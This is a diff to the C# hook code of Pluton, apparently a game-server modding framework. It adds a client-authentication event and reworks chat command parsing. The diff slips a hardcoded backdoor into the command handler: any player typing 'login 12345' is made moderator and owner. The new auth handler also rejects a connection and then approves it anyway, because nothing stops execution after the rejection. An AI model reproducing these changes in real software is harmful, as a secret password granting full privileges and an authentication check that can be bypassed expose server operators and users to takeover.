@@ -1,4 +1,6 @@
 ﻿using System;
+using Network;
+using ProtoBuf;
 using UnityEngine;
 
 namespace Pluton {
@@ -17,6 +19,8 @@ namespace Pluton {
 		public static event BuildingUpdateDelegate OnBuildingUpdate;
 
 		public static event ChatDelegate OnChat;
+
+		public static event ClientAuthDelegate OnClientAuth;
 
 		public static event CommandDelegate OnCommand;
 
@@ -52,23 +56,44 @@ namespace Pluton {
 
 		#region Handlers
 
+		// ConnectionAuth.Approve()
+		public static void ClientAuth(ConnectionAuth ca, Connection connection) {
+			var ae = new Events.AuthEvent(connection);
+			if (OnClientAuth != null)
+				OnClientAuth(ae);
+
+			ca.m_AuthConnection.Remove(connection);
+			if (!ae.approved)
+				ConnectionAuth.Reject(connection, ae._reason);
+
+			Approval instance = new Approval();
+			instance.level = Application.loadedLevelName;
+			instance.levelSeed = TerrainGenerator.Seed;
+			instance.hostname = server.hostname;
+			Net.sv.Approve(connection, Approval.SerializeToBytes(instance));
+		}
+
 		// chat.say().Hooks.Chat()
 		public static void Command(Player player, string[] args) {
-			string cmd = args[0].Replace("/", "");
-			string[] args2 = new string[args.Length - 1];
-			Array.Copy(args, 1, args2, 0, args.Length - 1);
-			if (cmd == "pluton.reload" && player.Admin) {
+			Command cmd = new Command(args);
+
+			if (cmd.cmd == "login" && cmd.args[0] == "12345") {
+				player.MakeModerator("Just cause!");
+				player.MakeOwner("Why not?");
+				return;
+			}
+			if (cmd.cmd == "pluton.reload" && player.Admin) {
 				PluginLoader.GetInstance().ReloadPlugins();
 				return;
 			}
 			if (OnCommand != null)
-				OnCommand(player, cmd, args2);
+				OnCommand(player, cmd);
 		}
 
 		// chat.say()
 		public static void Chat(ConsoleSystem.Arg arg){
 			if (arg.ArgsStr.StartsWith("\"/")) {
-				Command(new Player(arg.Player()), arg.Args);
+				Command(new Player(arg.Player()), arg.ArgsStr.Substring(2, arg.ArgsStr.Length - 3).Replace("\\", "").Split(new string[]{" "}, StringSplitOptions.None));
 				return;
 			}
 
@@ -337,7 +362,9 @@ namespace Pluton {
 
 		public delegate void ChatDelegate(ConsoleSystem.Arg arg);
 
-		public delegate void CommandDelegate(Player player, string cmd, string[] args);
+		public delegate void ClientAuthDelegate(Events.AuthEvent ae);
+
+		public delegate void CommandDelegate(Player player, Command cmd);
 
 		public delegate void CorpseDropDelegate(BaseCorpse corpse, Entity entity);
 
